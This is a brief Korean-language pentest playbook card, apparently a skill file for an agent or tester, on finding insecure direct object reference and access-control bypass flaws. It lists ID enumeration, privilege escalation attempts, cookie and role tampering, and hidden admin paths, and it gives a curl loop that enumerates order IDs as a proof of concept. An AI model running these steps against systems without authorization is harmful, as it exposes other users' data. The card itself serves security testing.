---
name: idor-authbypass
description: 접근제어 미흡으로 타 리소스·권한 접근
---
## When
숫자/추측가능 ID, 역할 기반 분기

## Tools
curl

## Procedure
1) ID 파라미터 열거
2) 수평/수직 권한 시도
3) 쿠키·role 조작
4) 숨은 관리 경로

## PoC
```
for i in $(seq 1 50);do curl "$U/order/$i";done
```

## Pitfalls
UUID여도 유출된 값 재사용; 강제 브라우징
